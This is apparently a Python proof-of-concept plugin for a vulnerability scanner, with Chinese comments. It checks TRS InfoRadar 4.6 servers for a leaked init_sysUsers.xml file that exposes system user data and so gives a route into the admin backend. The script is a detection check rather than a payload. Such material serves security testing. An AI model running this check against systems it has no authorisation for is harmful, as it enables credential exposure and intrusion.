# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'TRS-InfoRadar_0000'  # 平台漏洞编号，留空
    name = '拓尔思网络信息雷达系统 敏感信息泄漏到进后台'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-04-15'  # 漏洞公布时间
    desc = '''
        TRS网络信息雷达系统的主要功能是实时监控和采集目标网站的内容，对采集到的信息进行过滤阴门动分类处理，最终将最新内容及时发布出来，实现统一的信息导航功能，同时提供包括全文检索。彐期(范围)检索·标题检索、URL检索等在内的全方位信息查询手段。
        拓尔思网络信息雷达系统4.6, /inforadar/jsp/xml/init_sysUsers.xml 敏感信息泄漏到进后台。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=091999'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'TRS-InfoRadar(拓尔思网络信息雷达系统)'  # 漏洞应用名称
    product_version = '4.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'bae9eff3-c39a-4792-901b-9b665fee9778'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg+"/inforadar/jsp/xml/init_sysUsers.xml"
            code, head, res, errcode, _ = hh.http(url)
            if code == 200 and "java.beans.XMLDecoder" in res and 'property' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
